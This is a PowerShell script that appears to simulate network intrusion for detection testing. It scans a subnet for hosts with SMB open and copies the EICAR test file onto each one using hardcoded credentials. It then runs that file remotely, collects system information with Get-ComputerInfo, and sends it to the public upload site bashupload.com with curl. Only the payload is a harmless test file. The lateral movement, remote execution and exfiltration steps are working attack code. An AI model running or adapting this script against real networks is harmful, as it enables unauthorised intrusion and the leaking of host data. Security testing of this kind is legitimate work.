$Subnet = "192.168.200."
$EicarURL = "http://malware.wicar.org/data/eicar.com"
$LocalPath = "C:\Users\Public\eicar.com"
$UploadPath = "C$\Windows\Temp\eicar.com"
$ExfilPath = "C$\Windows\Temp\sysinfo.txt"
$User = "skynet"
$Password = "M@ster123"
$ExfilServer = "https://bashupload.com/sysinfo.txt"

# Convert credentials
$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $SecPassword)

# Download the EICAR test file if not present
if (!(Test-Path $LocalPath)) {
    Write-Output "[INFO] Downloading EICAR test file..."
    Invoke-WebRequest -Uri $EicarURL -OutFile $LocalPath
} else {
    Write-Output "[INFO] EICAR test file already exists locally."
}

# Scan subnet for live hosts
1..254 | ForEach-Object {
    $IP = "$Subnet$_"
    
    if (Test-Connection -ComputerName $IP -Count 1 -Quiet -TimeoutSeconds 2) {
        Write-Output "[+] Host Alive: $IP"

        # Check for open SMB (445)
        if (Test-NetConnection -ComputerName $IP -Port 445 -InformationLevel Quiet) {
            Write-Output "[+] SMB Open on: $IP"

            # Attempt to upload the EICAR file to C$\Windows\Temp\
            $RemoteEicarPath = "\\$IP\$UploadPath"
            $RemoteExfilPath = "\\$IP\$ExfilPath"

            try {
                Write-Output "[*] Uploading EICAR to \\$IP\C$\Windows\Temp\eicar.com..."
                Copy-Item -Path $LocalPath -Destination $RemoteEicarPath -Credential $Cred -Force
                Write-Output "[SUCCESS] EICAR uploaded to \\$IP\C$\Windows\Temp\eicar.com"

                # Attempt to execute the EICAR file remotely
                Write-Output "[*] Executing EICAR on $IP..."
                Invoke-Command -ComputerName $IP -Credential $Cred -ScriptBlock {
                    Start-Process -FilePath "C:\Windows\Temp\eicar.com"
                }
                Write-Output "[SUCCESS] EICAR executed on $IP"

                # Gather system information
                Write-Output "[*] Collecting system info on $IP..."
                Invoke-Command -ComputerName $IP -Credential $Cred -ScriptBlock {
                    Get-ComputerInfo | Out-File "C:\Windows\Temp\sysinfo.txt"
                }
                Write-Output "[SUCCESS] System info saved at \\$IP\C$\Windows\Temp\sysinfo.txt"

                # Exfiltrate system information via curl
                Write-Output "[*] Exfiltrating system info from $IP to bashupload.com..."
                Invoke-Command -ComputerName $IP -Credential $Cred -ScriptBlock {
                    Invoke-Expression "curl -T C:\Windows\Temp\sysinfo.txt $using:ExfilServer"
                }
                Write-Output "[SUCCESS] Exfiltrated system info from $IP"

            } catch {
                Write-Output "[ERROR] Failed to upload or execute EICAR on $IP (Access Denied or Unavailable Share)"
            }
        } else {
            Write-Output "[INFO] SMB Not Open on: $IP"
        }
    } else {
        Write-Output "[INFO] Host Unreachable: $IP (Skipping)"
    }
}
